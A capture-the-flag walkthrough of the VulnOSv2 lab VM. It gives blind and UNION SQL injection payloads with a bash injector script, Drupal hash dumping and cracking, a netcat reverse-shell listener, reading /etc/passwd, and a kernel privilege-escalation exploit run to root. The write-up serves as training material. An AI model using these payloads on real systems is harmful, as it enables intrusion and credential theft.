# VulnOSv2

**https://www.vulnhub.com/entry/vulnos-2,147/**

### NMAP

kali@kali:~$ nmap -A -sV 192.168.1.76
>Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-17 10:34 CET  
>Nmap scan report for 192.168.1.76  
>Host is up (0.00043s latency).  
>Not shown: 997 closed ports  
>PORT     STATE SERVICE VERSION  
>22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)  
>| ssh-hostkey:   
>|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)  
>|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)  
>|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)  
>|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (EdDSA)  
>80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))  
>|_http-server-header: Apache/2.4.7 (Ubuntu)  
>|_http-title: VulnOSv2  
>6667/tcp open  irc     ngircd  

### IRC

kali@kali:~$ telnet 192.168.1.76 6667
>Trying 192.168.1.76...
>Connected to 192.168.1.76.
>Escape character is '^]'.
>NICK test
>USER test 8 * : test test
>:irc.example.net 001 test :Welcome to the Internet Relay Network test!~test@kali.home  
>:irc.example.net 002 test :Your host is irc.example.net, running version ngircd-21 (i686/pc/linux-gnu)  
>:irc.example.net 003 test :This server has been started Wed Mar 14 2018 at 20:49:36 (CET)  
>:irc.example.net 004 test irc.example.net ngircd-21 abBcCioqrRswx abehiIklmMnoOPqQrRstvVz  
>:irc.example.net 005 test RFC2812 IRCD=ngIRCd CHARSET=UTF-8 CASEMAPPING=ascii PREFIX=(qaohv)~&@%+ CHANTYPES=#&+ CHANMODES=beI,k,l,imMnOPQRstVz CHANLIMIT=#&+:10 :are supported on this server  
>:irc.example.net 005 test CHANNELLEN=50 NICKLEN=9 TOPICLEN=490 AWAYLEN=127 KICKLEN=400 MODES=5 MAXLIST=beI:50 EXCEPTS=e INVEX=I PENALTY :are supported on this server  
>:irc.example.net 251 test :There are 1 users and 0 services on 1 servers  
>:irc.example.net 254 test 1 :channels formed  
>:irc.example.net 255 test :I have 1 users, 0 services and 0 servers  
>:irc.example.net 265 test 1 1 :Current local users: 1, Max: 1  
>:irc.example.net 266 test 1 1 :Current global users: 1, Max: 1  
>:irc.example.net 250 test :Highest connection count: 2 (6 connections received)  
>:irc.example.net 375 test :- irc.example.net message of the day  
>:irc.example.net 372 test :- **************************************************  
>:irc.example.net 372 test :- *             H    E    L    L    O              *  
>:irc.example.net 372 test :- *  This is a private irc server. Please contact  *  
>:irc.example.net 372 test :- *  the admin of the server for any questions or  *  
>:irc.example.net 372 test :- *  issues.                                       *  
>:irc.example.net 372 test :- **************************************************  
>:irc.example.net 372 test :- *  The software was provided as a package of     *  
>:irc.example.net 372 test :- *  Debian GNU/Linux <http://www.debian.org/>.    *  
>:irc.example.net 372 test :- *  However, Debian has no control over this      *  
>:irc.example.net 372 test :- *  server.                                       *  
>:irc.example.net 372 test :- **************************************************  
>:irc.example.net 376 test :End of MOTD command  
>admin  
>:irc.example.net 256 test irc.example.net :Administrative info  
>:irc.example.net 257 test :Debian User  
>:irc.example.net 258 test :Debian City  
>:irc.example.net 259 test :irc@irc.example.com  
>list  
>:irc.example.net 322 test &SERVER 0 :Server Messages  
>:irc.example.net 323 test :End of LIST  
>lusers  
>:irc.example.net 251 test :There are 1 users and 0 services on 1 servers  
>:irc.example.net 254 test 1 :channels formed  
>:irc.example.net 255 test :I have 1 users, 0 services and 0 servers  
>:irc.example.net 265 test 1 1 :Current local users: 1, Max: 1  
>:irc.example.net 266 test 1 1 :Current global users: 1, Max: 1  
>:irc.example.net 250 test :Highest connection count: 2 (6 connections received)  
>quit  

### HTTP

view-source:http://192.168.1.76/jabc/?q=node/7
><div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><p><span style="color:#000000">Dear customer,</span></p>  
><p><span style="color:#000000">For security reasons, this section is hidden.</span></p>  
><p><span style="color:#000000">For a detailed view and documentation of our products, please visit our documentation platform at **/jabcd0cs/** on the server. Just login with **guest/guest**</span></p>  
><p><span style="color:#000000">Thank you.</span></p>  
><p> </p>  

### SQLi

http://192.168.1.76/jabcd0cs/details.php?id=1%27&state=2
>Error in querying: SELECT * FROM odm_user_perms WHERE odm_user_perms.uid = 2 AND odm_user_perms.fid = 1\' AND odm_user_perms.rights>=1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\' AND odm_user_perms.rights>=1' at line 1  


http://192.168.1.76/jabcd0cs/details.php?id=1%20and%20(select%20length(odm_user)%20from%20odm_user_perms%20where%20odm_user=%22guest%22)=6&state=2
>Error in querying: SELECT * FROM odm_user_perms WHERE odm_user_perms.uid = 2 AND odm_user_perms.fid = 1 and (select length(odm AND odm_user_perms.rights>=1You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1  

**Char "_" is banned T.T'**

kali@kali:~$ curl -s 'http://192.168.1.76/jabcd0cs/details.php?id=1%20and%201=1&state=2' -H 'Host: 192.168.1.76' -H 'Cookie: SpryMedia_DataTables_filetable_out.php=%7B%22iCreate%22%3A1521279979936%2C%22iStart%22%3A0%2C%22iEnd%22%3A10%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; SpryMedia_Da taTables_filetable_search.php=%7B%22iCreate%22%3A1521280061413%2C%22iStart%22%3A0%2C%22iEnd%22%3A1%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; has_js=1; PHPSESSID=s7p59g7pp1hhj1mo39da7ordl7' | grep -c "images/file_unlocked.png"  
>1  
kali@kali:~$ curl -s 'http://192.168.1.76/jabcd0cs/details.php?id=1%20and%201=2&state=2' -H 'Host: 192.168.1.76' -H 'Cookie: SpryMedia_DataTables_filetable_out.php=%7B%22iCreate%22%3A1521279979936%2C%22iStart%22%3A0%2C%22iEnd%22%3A10%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; SpryMedia_DataTables_filetable_search.php=%7B%22iCreate%22%3A1521280061413%2C%22iStart%22%3A0%2C%22iEnd%22%3A1%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; has_js=1; PHPSESSID=s7p59g7pp1hhj1mo39da7ordl7' | grep -c "images/file_unlocked.png"  
>0  

**We found our blind sqli! Let's script it!**

kali@kali:~$ cat injector.sh 
>#!/bin/bash  
>
>#GET INJECTION  
>INJ=$1  
>
>#SANITIZE VARIABLE  
>_INJ_=$(echo $INJ | sed 's/ /%20/g' | sed "s/'/%27/g" | sed 's/"/%22/g' )  
>
>curl -s "http://192.168.1.76/jabcd0cs/details.php?id=1%20and%20$_INJ_&state=2" -H 'Host: 192.168.1.76' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://192.168.1.76/jabcd0cs/out.php?' -H 'Cookie: SpryMedia_DataTables_filetable_out.php=%7B%22iCreate%22%3A1521654334977%2C%22iStart%22%3A0%2C%22iEnd%22%3A10%2C%22iLength%22%3A10%2C%22sFilter%22%3A%22%22%2C%22sFilterEsc%22%3Atrue%2C%22aaSorting%22%3A%5B%20%5B0%2C%22asc%22%5D%5D%2C%22aaSearchCols%22%3A%5B%20%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%2C%5B%22%22%2Ctrue%5D%5D%2C%22abVisCols%22%3A%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; has_js=1; PHPSESSID=tlepojod9vsfojcqj7eao6t9j4' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' | grep -c "images/file_unlocked.png"  


**Testing**  
kali@kali:~$ ./injector.sh "1=1"  
>1  
kali@kali:~$ ./injector.sh "1=2"  
>0  
kali@kali:~$ ./injector.sh "(select length(1000000000000000000000000000000000000000000000000000000000000000000000))=70"  
>1  


**Exploiting**  
kali@kali:~$ for i in {1..20}; do RES=$(./injector.sh "(select length(user()))=$i"); if [[ $RES == 1 ]]; then echo "[+]Length found: $i";fi; done  
>[+]Length found: 14  

kali@kali:~$ for((h=1; h<=14; h++)); do for i in {32..126}; do RES=$(./injector.sh "(select hex(substr(user(),$h,1)))=hex($i)"); if [[ $RES == 1 ]]; then printf \\$(printf '%03o\n' "$i"); fi; done; done; echo ""  
>root@localhost  

kali@kali:~$ for i in {1..20}; do RES=$(./injector.sh "(select length(user()))=$i"); if [[ $RES == 1 ]]; then echo "[+]Length found: $i";fi; done  
>[+]Length found: 8  

kali@kali:~$ for((h=1; h<=8; h++)); do for i in {32..126}; do RES=$(./injector.sh "(select hex(substr(database(),$h,1)))=hex($i)"); if [[ $RES == 1 ]]; then printf \\$(printf '%03o\n' "$i"); fi; done; done; echo ""  
>jabcd0cs  

**Couldn't go any further :(**  

**Googling version**  

OpenDocMan v1.2.7  

https://www.exploit-db.com/exploits/32075/  

http://192.168.1.76/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,schema_name,3,4,5,6,7,8,9%20from%20information_schema.schemata
>information_schema  
>drupal7  
>jabcd0cs  
>mysql  
>performance_schema  
>phpmyadmin  

http://192.168.1.76/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,name,3,4,5,6,7,8,9%20from%20drupal7.users
>webmin

http://192.168.1.76/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user%20UNION%20SELECT%201,pass,3,4,5,6,7,8,9%20from%20drupal7.users
>$S$DPc41p2JwLXR6vgPCi.jC7WnRMkw3Zge3pVoJFnOn6gfMfsOr/Ug

kali@kali:~$ sudo john pass  
>Using default input encoding: UTF-8  
>Loaded 1 password hash (Drupal7, $S$ [SHA512 128/128 AVX 2x])  
>Press 'q' or Ctrl-C to abort, almost any other key for status  
>webmin1980        

### REVERSE SHELL

**Found login info in http://192.168.1.76/jabc/robots.txt**

http://192.168.1.76/jabc/?q=user

**Login as admin and enable PHP module**

>PHP filter  
>	7.26	Allows embedded PHP code/snippets to be evaluated.  
>

**Change theme and enable it as PHP Code**

>    A PHP code text format has been created.  
>    The configuration options have been saved.  


kali@kali:~$ sudo nc -nvlp 4444
>listening on [any] 4444 ...  
>connect to [192.168.1.115] from (UNKNOWN) [192.168.1.76] 35532  
>Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux  
> 04:32:42 up 3 days,  7:43,  1 user,  load average: 0.00, 0.01, 0.05  
>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT  
>webmin   pts/0    kali.home        04:13   13:06   0.14s  0.10s mysql -u root -p  
>uid=33(www-data) gid=33(www-data) groups=33(www-data)  
>/bin/sh: 0: can't access tty; job control turned off  
>$ $ $   
>$ id  
>uid=33(www-data) gid=33(www-data) groups=33(www-data)  
>$ cat /etc/passwd  
>root:x:0:0:root:/root:/bin/bash  
>vulnosadmin:x:1000:1000:vulnosadmin,,,:/home/vulnosadmin:/bin/bash  
>webmin:x:1001:1001::/home/webmin:  

**Same user in system? >.<**

### SSH

kali@kali:~$ ssh -l webmin 192.168.1.76

webmin@VulnOSv2:~$ uname -a
>Linux VulnOSv2 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:31:42 UTC 2014 i686 i686 i686 GNU/Linux

### LOCAL PRIVILEGE ESCALATION EXPLOIT

https://www.exploit-db.com/raw/37292/

webmin@VulnOSv2:~$ gcc exploit.c -o exploit
webmin@VulnOSv2:~$ chmod +x exploit
webmin@VulnOSv2:~$ ./exploit 
>spawning threads  
>mount #1  
>mount #2  
>child threads done  
>/etc/ld.so.preload created  
>creating shared library  
>\# id    
>uid=0(root) gid=0(root) groups=0(root),1001(webmin)  
>\# /bin/bash	  
root@VulnOSv2:/home/webmin# 

root@VulnOSv2:/home/webmin# cd /root
root@VulnOSv2:/root# ls -la
>total 36  
>drwx------  3 root root 4096 May  4  2016 .  
>drwxr-xr-x 21 root root 4096 Apr  3  2016 ..  
>-rw-------  1 root root    9 May  4  2016 .bash_history  
>-rw-r--r--  1 root root 3106 Feb 20  2014 .bashrc  
>drwx------  2 root root 4096 May  2  2016 .cache  
>-rw-r--r--  1 root root  140 Feb 20  2014 .profile  
>-rw-------  1 root root    3 May  2  2016 .psql_history  
>-rw-------  1 root root  735 May  4  2016 .viminfo  
>-rw-r--r--  1 root root  165 May  4  2016 **flag.txt**  
root@VulnOSv2:/root# cat flag.txt
>Hello and welcome.  
>You successfully compromised the company "JABC" and the server completely !!  
>Congratulations !!!  
>Hope you enjoyed it.  
>  
>What do you think of A.I.?  
